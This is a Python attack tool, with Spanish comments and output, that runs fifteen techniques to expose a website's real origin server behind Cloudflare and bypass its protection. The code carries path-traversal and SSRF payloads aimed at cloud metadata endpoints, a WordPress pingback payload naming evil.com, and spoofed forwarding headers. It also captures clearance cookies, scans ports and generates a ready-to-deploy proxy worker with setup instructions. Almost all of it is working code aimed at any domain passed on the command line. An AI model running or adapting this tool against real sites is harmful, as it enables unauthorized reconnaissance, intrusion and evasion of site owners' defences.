#!/usr/bin/env python3
"""
CLOUDFLARE BYPASS ULTIMATE v6.0 - TODAS LAS TÉCNICAS CONOCIDAS
Unificación de: advanced_bypass + mega_bypass + nuevas técnicas
"""

import asyncio
import aiohttp
import socket
import dns.resolver
import ssl
import json
import re
import subprocess
import random
import time
from datetime import datetime, timedelta
from urllib.parse import urlparse
from ipaddress import ip_address, ip_network
try:
    from .http_client import get_session, DEFAULT_HEADERS, TIMEOUT
except ImportError:
    from http_client import get_session, DEFAULT_HEADERS, TIMEOUT
class CloudflareBypass:
    """UNIFICADO: Todas las técnicas de bypass de Cloudflare"""
    def __init__(self, domain, securitytrails_api=None, shodan_api=None, censys_api=None):
        self.domain = domain
        self.base_domain = self._extract_base_domain(domain)
        self.securitytrails_api = securitytrails_api
        self.shodan_api = shodan_api
        self.censys_api = censys_api
        self.results = {
            'domain': domain,
            'base_domain': self.base_domain,
            'timestamp': str(datetime.now()),
            'origin_ips': [],
            'subdominios_no_proxy': [],
            'historical_ips': [],
            'email_servers': [],
            'certificates': [],
            'bypass_methods': {},
            'workers_proxy': None,
            'cookies_capturadas': [],
            'user_agents_exitosos': [],
            'tls_fingerprints': []
        }
        # ============ TÉCNICA 1: SUBDOMINIOS CRÍTICOS ============
        self.critical_subdomains = [
            'direct', 'origin', 'origin-www', 'direct-www', 'origin-server',
            'origin1', 'origin2', 'origin-backend', 'backend-origin',
            'mail', 'webmail', 'smtp', 'pop', 'imap', 'mail1', 'mail2',
            'mx', 'mx1', 'mx2', 'email', 'outlook', 'zimbra', 'roundcube',
            'cpanel', 'whm', 'plesk', 'directadmin', 'vesta', 'webmin',
            'panel', 'admin', 'administrator', 'dashboard', 'manager',
            'server', 'cp', 'control', 'management',
            'dev', 'development', 'staging', 'stage', 'test', 'testing',
            'beta', 'alpha', 'gamma', 'rc', 'release', 'demo', 'sandbox',
            'qa', 'quality', 'uat', 'preprod', 'pre-production',
            'api', 'api-dev', 'api-staging', 'api-test', 'api-v1', 'api-v2',
            'graphql', 'graphql-dev', 'rest', 'rest-api', 'backend',
            'ftp', 'sftp', 'ssh', 'vpn', 'remote', 'access', 'secure',
            'radius', 'ldap', 'kerberos', 'ntp', 'sip',
            'db', 'database', 'mysql', 'postgres', 'redis', 'mongodb',
            'mongo', 'cassandra', 'elastic', 'elasticsearch', 'kibana',
            'grafana', 'prometheus', 'influxdb', 'timescaledb',
            'jenkins', 'gitlab', 'github', 'bitbucket', 'jira', 'confluence',
            'sonar', 'sonarqube', 'nexus', 'artifactory', 'maven', 'gradle',
            'backup', 'backups', 'old', 'archive', 'archives', 'bak',
            'temp', 'tmp', 'cache', 'cached', 'files', 'download',
            'uploads', 'static', 'assets', 'media', 'cdn', 'storage',
            'lb', 'loadbalancer', 'proxy', 'gateway', 'router', 'firewall',
            'autodiscover', 'autoconfig'
        ]
        # ============ TÉCNICA 2: ENDPOINTS ACME/WELL-KNOWN ============
        self.acme_paths = [
            '/.well-known/acme-challenge/',
            '/.well-known/acme-challenge/test',
            '/.well-known/acme-challenge/../../admin',
            '/.well-known/acme-challenge/..;/admin',
            '/.well-known/acme-challenge/..%2fadmin',
            '/.well-known/acme-challenge/..%252fadmin',
            '/.well-known/pki-validation/',
            '/.well-known/pki-validation/test.txt',
            '/.well-known/',
            '/.well-known/security.txt'
        ]
        # ============ TÉCNICA 3: PATH TRAVERSAL ============
        self.path_traversal = [
            '/..;/', '/..;/admin', '/..;/api', '/..;/config',
            '/.;/', '/.;/admin', '/.;/api',
            '/...;/', '/....//', '/..;/..;/',
            '/%2e/', '/%252e/', '/%25252e/',
            '/;/', '/;/admin', '/;/api'
        ]
        # ============ TÉCNICA 4: USER-AGENTS ============
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
            'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)'
        ]
        # ============ TÉCNICA 5: ACCEPT LANGUAGES ============
        self.accept_languages = [
            'en-US,en;q=0.9',
            'es-ES,es;q=0.9,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8',
            'pt-BR,pt;q=0.9,en;q=0.8'
        ]
        # ============ TÉCNICA 6: RANGOS CLOUDFLARE ============
        self.cloudflare_ranges = [
            '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
            '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
            '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
            '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
            '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
        ]
        # ============ TÉCNICA 7: RESOLVERS DNS ============
        self.resolvers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9']
        # ============ TÉCNICA 8: PUERTOS COMUNES ============
        self.common_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096, 2078, 2079, 7080, 7081]
        # ============ TÉCNICA 9: PAYLOAD PINGBACK ============
        self.pingback_payload = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://evil.com/</string></value></param>
<param><value><string>http://{domain}/</string></value></param>
</params>
</methodCall>"""
        # ============ TÉCNICA 10: PAYLOADS SSRF ============
        self.ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:443/',
            'http://localhost/',
            'http://[::1]/'
        ]
        # ============ TÉCNICA 11: HEADERS ESPECIALES ============
        self.special_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'}
        ]
    def _extract_base_domain(self, domain):
        """Extrae dominio base"""
        parts = domain.split('.')
        if len(parts) > 2:
            return '.'.join(parts[-2:])
        return domain
    def is_cloudflare_ip(self, ip):
        """Verifica si IP es de Cloudflare"""
        try:
            ip_obj = ip_address(ip)
            for cidr in self.cloudflare_ranges:
                if ip_obj in ip_network(cidr):
                    return True
        except:
            pass
        return False
    # ==================== TÉCNICA 1: SUBDOMINIOS NO PROXY ====================
    async def technique_subdomains(self):
        """Busca subdominios fuera de Cloudflare"""
        print(f"\n[🔍] TÉCNICA 1: Subdominios no proxy ({len(self.critical_subdomains)} pruebas)")
        async def check_subdomain(sub):
            hostname = f"{sub}.{self.domain}"
            try:
                loop = asyncio.get_event_loop()
                ip = await loop.run_in_executor(None, socket.gethostbyname, hostname)
                if not self.is_cloudflare_ip(ip):
                    # Intentar conexión HTTP
                    try:
                        session = await get_session()
                        url = f"http://{hostname}"
                        async with session.get(url, timeout=30, allow_redirects=False) as resp:
                            self.results['subdominios_no_proxy'].append({
                                'subdominio': hostname,
                                'ip': ip,
                                'status': resp.status,
                                'metodo': 'HTTP'
                            })
                            print(f"   [[CRITICO]] IP REAL: {hostname} → {ip} (HTTP {resp.status})")
                    except:
                        # Solo IP, no HTTP
                        self.results['subdominios_no_proxy'].append({
                            'subdominio': hostname,
                            'ip': ip,
                            'status': 'no-http',
                            'metodo': 'DNS'
                        })
                        print(f"   [✓] IP DNS: {hostname} → {ip}")
                    finally:
                        await session.close()
            except:
                pass
        tasks = [check_subdomain(sub) for sub in self.critical_subdomains]
        await asyncio.gather(*tasks)
    # ==================== TÉCNICA 2: CERTIFICADOS SSL (CRT.sh) ====================
    async def technique_crt_sh(self):
        """Busca IPs en certificados SSL históricos"""
        print(f"\n[[SECURE]] TÉCNICA 2: CRT.sh (certificados históricos)")
        try:
            session = await get_session()
            url = f"https://crt.sh/?q={self.base_domain}&output=json"
            async with session.get(url, timeout=30) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    unique_ips = set()
                    for cert in data[:100]:
                        if 'ip_addresses' in cert and cert['ip_addresses']:
                            for ip in cert['ip_addresses']:
                                if not self.is_cloudflare_ip(ip):
                                    unique_ips.add(ip)
                        if 'name_value' in cert:
                            names = cert['name_value'].split('\n')
                            for name in names:
                                if name.endswith(self.base_domain) and name != self.domain:
                                    self.results['certificates'].append({
                                        'subdominio': name,
                                        'not_before': cert.get('not_before', ''),
                                        'not_after': cert.get('not_after', '')
                                    })
                    for ip in unique_ips:
                        self.results['historical_ips'].append({
                            'source': 'CRT.sh',
                            'ip': ip,
                            'first_seen': 'historical'
                        })
                        print(f"   [[CRITICO]] IP HISTÓRICA: {ip}")
        except Exception as e:
            print(f"   Error CRT.sh: {e}")
        finally:
            await session.close()
    # ==================== TÉCNICA 3: SECURITYTRAILS ====================
    async def technique_securitytrails(self):
        """Usa SecurityTrails API si está disponible"""
        if not self.securitytrails_api:
            print(f"\n[ℹ️] TÉCNICA 3: SecurityTrails - API key no disponible")
            return
        print(f"\n[📊] TÉCNICA 3: SecurityTrails DNS history")
        # Implementar si se necesita
    # ==================== TÉCNICA 4: SHODAN ====================
    async def technique_shodan(self):
        """Busca en Shodan si hay API key"""
        if not self.shodan_api:
            return
        # Implementar si se necesita
    # ==================== TÉCNICA 5: REGISTROS MX/SPF ====================
    async def technique_mx_spf(self):
        """Busca IPs en registros MX y SPF"""
        print(f"\n[📧] TÉCNICA 5: Registros MX/SPF")
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = self.resolvers
            try:
                mx_records = resolver.resolve(self.domain, 'MX')
                for mx in mx_records:
                    mx_domain = str(mx.exchange).rstrip('.')
                    try:
                        ip = socket.gethostbyname(mx_domain)
                        if not self.is_cloudflare_ip(ip):
                            self.results['email_servers'].append({
                                'source': f'MX: {mx_domain}',
                                'ip': ip,
                                'priority': mx.preference
                            })
                            print(f"   [[CRITICO]] MX SERVER: {mx_domain} → {ip}")
                    except:
                        pass
            except:
                pass
            try:
                txt_records = resolver.resolve(self.domain, 'TXT')
                for txt in txt_records:
                    txt_str = str(txt)
                    if 'v=spf1' in txt_str:
                        ips = re.findall(r'ip[46]:([0-9./]+)', txt_str)
                        for ip in ips:
                            if '/' not in ip:
                                self.results['email_servers'].append({
                                    'source': 'SPF',
                                    'ip': ip
                                })
                                print(f"   [✓] IP SPF: {ip}")
            except:
                pass
        except Exception as e:
            print(f"   Error DNS: {e}")
    # ==================== TÉCNICA 6: ACME CHALLENGE ====================
    async def technique_acme(self):
        """Prueba endpoints ACME"""
        print(f"\n[⚡] TÉCNICA 6: ACME challenge bypass")
        session = await get_session()
        try:
            for path in self.acme_paths:
                url = f"http://{self.domain}{path}"
                try:
                    async with session.get(url, timeout=30, allow_redirects=False) as resp:
                        if resp.status != 404:
                            self.results['bypass_methods']['acme'] = {
                                'url': url,
                                'status': resp.status,
                                'note': 'ACME endpoint responde - posible origen'
                            }
                            print(f"   [✓] ACME: {url} → {resp.status}")
                            for traversal in self.path_traversal:
                                test_url = f"http://{self.domain}{traversal}"
                                try:
                                    async with session.get(test_url, timeout=30) as t_resp:
                                        if t_resp.status != 404:
                                            print(f"      ↳ Traversal {traversal}: {t_resp.status}")
                                except:
                                    pass
                except:
                    pass
        finally:
            await session.close()
    # ==================== TÉCNICA 7: WORDPRESS PINGBACK ====================
    async def technique_pingback(self):
        """Abusa de pingbacks en WordPress"""
        print(f"\n[[XSS]] TÉCNICA 7: WordPress pingback abuse")
        pingback_url = f"http://{self.domain}/xmlrpc.php"
        payload = self.pingback_payload.format(domain=self.domain)
        session = await get_session()
        try:
            async with session.post(pingback_url, data=payload, timeout=30) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    if 'faultCode' not in text:
                        self.results['bypass_methods']['pingback'] = {
                            'url': pingback_url,
                            'status': resp.status,
                            'note': 'WordPress pingback activo'
                        }
                        print(f"   [✓] Pingback activo en {pingback_url}")
        except:
            pass
        finally:
            await session.close()
    # ==================== TÉCNICA 8: CLOUDFLARE WORKERS ====================
    async def technique_workers(self):
        """Genera worker para usar como proxy"""
        print(f"\n[🛠️] TÉCNICA 8: Cloudflare Workers proxy")
        worker_code = """
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})
async function handleRequest(request) {
  const ORIGIN_IP = 'IP_AQUI';
  const TARGET_HOST = 'DOMINIO_AQUI';
  const url = new URL(request.url);
  const originUrl = `http://${ORIGIN_IP}${url.pathname}${url.search}`;
  const modifiedRequest = new Request(originUrl, {
    method: request.method,
    headers: request.headers,
    body: request.body
  });
  modifiedRequest.headers.set('Host', TARGET_HOST);
  modifiedRequest.headers.set('X-Forwarded-For', request.headers.get('CF-Connecting-IP') || '');
  try {
    const response = await fetch(modifiedRequest);
    const newHeaders = new Headers(response.headers);
    newHeaders.set('X-Proxied-By', 'Cloudflare-Worker');
    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    });
  } catch (e) {
    return new Response('Error connecting to origin: ' + e.message, { status: 502 });
  }
}
"""
        self.results['workers_proxy'] = {
            'code': worker_code,
            'instructions': [
                '1. Crear cuenta en Cloudflare Workers (gratis)',
                '2. Desplegar este worker',
                '3. Configurar ORIGIN_IP con IP encontrada',
                '4. Configurar TARGET_HOST con el dominio original',
                '5. Acceder via worker-url.workers.dev'
            ]
        }
        print("   [✓] Worker generado (ver reporte)")
    # ==================== TÉCNICA 9: COOKIE REUSE ====================
    async def technique_cookie_reuse(self):
        """Captura cookies cf_clearance para reutilizar"""
        print(f"\n[🍪] TÉCNICA 9: Captura de cookies")
        session = await get_session()
        try:
            for ua in self.user_agents[:3]:
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': random.choice(self.accept_languages),
                }
                try:
                    async with session.get(f"http://{self.domain}", headers=headers, timeout=30) as resp:
                        cookies = session.cookie_jar.filter_cookies(f"http://{self.domain}")
                        for cookie in cookies:
                            if cookie.startswith('cf_clearance'):
                                self.results['cookies_capturadas'].append({
                                    'cookie': cookie,
                                    'value': cookies[cookie].value,
                                    'user_agent': ua,
                                    'domain': self.domain
                                })
                                print(f"   [✓] Cookie cf_clearance capturada con {ua[:30]}...")
                                if ua not in self.results['user_agents_exitosos']:
                                    self.results['user_agents_exitosos'].append(ua)
                except:
                    pass
        finally:
            await session.close()
    # ==================== TÉCNICA 10: TLS FINGERPRINTING ====================
    async def technique_tls_fingerprint(self):
        """Intenta bypass de TLS fingerprinting"""
        print(f"\n[🔑] TÉCNICA 10: TLS fingerprinting bypass")
        try:
            proc = await asyncio.create_subprocess_exec(
                'curl-impersonate-chrome', '-s', '-I', f'https://{self.domain}',
                stdout=asyncio.PIPE, stderr=asyncio.PIPE
            )
            stdout, stderr = await proc.communicate()
            self.results['tls_fingerprints'].append({
                'tool': 'curl-impersonate',
                'success': proc.returncode == 0
            })
            print(f"   [✓] curl-impersonate: {'OK' if proc.returncode == 0 else 'FAIL'}")
        except:
            print("   [ℹ️] curl-impersonate no instalado")
    # ==================== TÉCNICA 11: ESCANEO DE PUERTOS ====================
    async def technique_port_scan(self, ip):
        """Escanea puertos en IP encontrada"""
        print(f"\n[🔌] TÉCNICA 11: Escaneo de puertos en {ip}")
        open_ports = []
        for port in self.common_ports:
            try:
                conn = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(conn, timeout=1)
                writer.close()
                await writer.wait_closed()
                open_ports.append(port)
                print(f"   [✓] Puerto {port} abierto")
            except:
                pass
        if open_ports:
            self.results['bypass_methods']['port_scan'] = {
                'ip': ip,
                'open_ports': open_ports
            }
    # ==================== TÉCNICA 12: GOOGLE DORKS ====================
    async def technique_google_dorks(self):
        """Genera dorks para búsqueda manual"""
        print(f"\n[🔍] TÉCNICA 12: Google dorks")
        dorks = [
            f'site:{self.domain} -site:www.{self.domain}',
            f'intitle:"{self.domain}" inurl:admin',
            f'inurl:{self.domain} ext:log | ext:txt | ext:conf',
            f'"{self.base_domain}" "nginx" | "apache" | "iis"',
            f'site:pastebin.com "{self.domain}"',
            f'site:github.com "{self.domain}"',
            f'site:stackoverflow.com "{self.domain}"',
            f'inurl:"{self.domain}" "origin" | "direct"'
        ]
        self.results['bypass_methods']['google_dorks'] = {
            'dorks': dorks,
            'note': 'Usar en Google para encontrar IPs/subdominios'
        }
        for dork in dorks[:3]:
            print(f"   • {dork}")
    # ==================== TÉCNICA 13: CDN-CGI INFO ====================
    async def technique_cdn_info(self):
        """Obtiene info de /cdn-cgi/"""
        print(f"\n[📡] TÉCNICA 13: CDN-CGI info")
        paths = ['/cdn-cgi/trace', '/cdn-cgi/l', '/cdn-cgi/']
        session = await get_session()
        try:
            for path in paths:
                url = f"http://{self.domain}{path}"
                try:
                    async with session.get(url, timeout=30) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if 'colo=' in text:
                                colo = re.search(r'colo=([A-Z]+)', text)
                                ip = re.search(r'ip=([0-9.]+)', text)
                                info = {
                                    'url': url,
                                    'colo': colo.group(1) if colo else 'unknown'
                                }
                                if ip:
                                    info['visitor_ip'] = ip.group(1)
                                self.results['bypass_methods']['cdn_info'] = info
                                print(f"   [✓] CDN info: {url} → {info['colo']}")
                except:
                    pass
        finally:
            await session.close()
    # ==================== TÉCNICA 14: HEADERS ESPECIALES ====================
    async def technique_headers(self):
        """Prueba headers que pueden revelar IP"""
        print(f"\n[📨] TÉCNICA 14: Headers reveladores")
        session = await get_session()
        try:
            for headers in self.special_headers:
                try:
                    async with session.get(f"http://{self.domain}", headers=headers, timeout=30) as resp:
                        if 'X-Origin-IP' in resp.headers:
                            print(f"   [[CRITICO]] IP en header X-Origin-IP: {resp.headers['X-Origin-IP']}")
                        if 'X-Backend-IP' in resp.headers:
                            print(f"   [[CRITICO]] IP en header X-Backend-IP: {resp.headers['X-Backend-IP']}")
                except:
                    pass
        finally:
            await session.close()
    # ==================== TÉCNICA 15: SSRF / OPEN PROXY ====================
    async def technique_ssrf(self):
        """Busca endpoints vulnerables a SSRF"""
        print(f"\n[🌍] TÉCNICA 15: SSRF / Open proxy")
        endpoints = [
            '/proxy', '/proxy.php', '/fetch', '/curl', '/url',
            '/api/proxy', '/external', '/load', '/getUrl'
        ]
        session = await get_session()
        try:
            for endpoint in endpoints:
                url = f"http://{self.domain}{endpoint}"
                for payload in self.ssrf_payloads[:3]:
                    try:
                        params = {'url': payload}
                        async with session.get(url, params=params, timeout=30) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                if 'meta-data' in text or '127.0.0.1' in text:
                                    self.results['bypass_methods']['ssrf'] = {
                                        'url': url,
                                        'payload': payload,
                                        'status': resp.status
                                    }
                                    print(f"   [[CRITICO]] SSRF encontrado: {url} con {payload}")
                    except:
                        pass
        finally:
            await session.close()
    # ==================== EJECUCIÓN PRINCIPAL ====================
    async def run(self):
        """Ejecuta TODAS las técnicas"""
        print(f"\n{'='*60}")
        print(f"[CRITICO] CLOUDFLARE BYPASS ULTIMATE v6.0 - {self.domain}")
        print(f"{'='*60}")
        print("Técnicas: 15 métodos avanzados")
        print(f"{'='*60}")
        start_time = time.time()
        await self.technique_subdomains()
        await self.technique_crt_sh()
        await self.technique_securitytrails()
        await self.technique_shodan()
        await self.technique_mx_spf()
        await self.technique_acme()
        await self.technique_pingback()
        await self.technique_workers()
        await self.technique_cookie_reuse()
        await self.technique_tls_fingerprint()
        await self.technique_google_dorks()
        await self.technique_cdn_info()
        await self.technique_headers()
        await self.technique_ssrf()
        all_ips = []
        for ip_info in self.results['subdominios_no_proxy']:
            if ip_info.get('ip') and ip_info['ip'] not in all_ips:
                all_ips.append(ip_info['ip'])
        for ip_info in self.results['historical_ips']:
            if ip_info.get('ip') and ip_info['ip'] not in all_ips:
                all_ips.append(ip_info['ip'])
        for ip_info in self.results['email_servers']:
            if ip_info.get('ip') and ip_info['ip'] not in all_ips:
                all_ips.append(ip_info['ip'])
        if all_ips:
            for ip in all_ips[:3]:
                await self.technique_port_scan(ip)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"📊 RESULTADOS BYPASS ULTIMATE ({elapsed:.1f}s)")
        print(f"{'='*60}")
        if self.results['subdominios_no_proxy']:
            print(f"\n[CRITICO] SUBDOMINIOS FUERA DE CLOUDFLARE ({len(self.results['subdominios_no_proxy'])}):")
            for sub in self.results['subdominios_no_proxy']:
                print(f"   • {sub['subdominio']} → {sub['ip']} ({sub.get('status', 'N/A')})")
        if self.results['historical_ips']:
            print(f"\n📜 IPs HISTÓRICAS ({len(self.results['historical_ips'])}):")
            for ip in self.results['historical_ips']:
                print(f"   • {ip['source']}: {ip['ip']}")
        if self.results['email_servers']:
            print(f"\n📧 SERVIDORES EMAIL ({len(self.results['email_servers'])}):")
            for mail in self.results['email_servers']:
                print(f"   • {mail['source']}: {mail['ip']}")
        if self.results['cookies_capturadas']:
            print(f"\n🍪 COOKIES CAPTURADAS ({len(self.results['cookies_capturadas'])}):")
            for cookie in self.results['cookies_capturadas'][:3]:
                print(f"   • cf_clearance: {cookie['value'][:30]}...")
        if self.results['bypass_methods']:
            print(f"\n🛠️ TÉCNICAS DISPONIBLES:")
            for method, data in self.results['bypass_methods'].items():
                print(f"   • {method.upper()}")
        filename = f"cf_ultimate_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n💾 Resultados guardados en {filename}")
        return self.results
async def main():
    import sys
    if len(sys.argv) < 2:
        print("""
╔═══════════════════════════════════════════════════════════════════╗
║         CLOUDFLARE BYPASS ULTIMATE v6.0 - 15 TÉCNICAS            ║
╚═══════════════════════════════════════════════════════════════════╝
Uso: python3 cloudflare_bypass.py <dominio> [securitytrails_api] [shodan_api]
        """)
        sys.exit(1)
    domain = sys.argv[1]
    st_api = sys.argv[2] if len(sys.argv) > 2 else None
    shodan_api = sys.argv[3] if len(sys.argv) > 3 else None
    bypass = CloudflareBypass(domain, st_api, shodan_api)
    await bypass.run()
if __name__ == "__main__":
    asyncio.run(main())
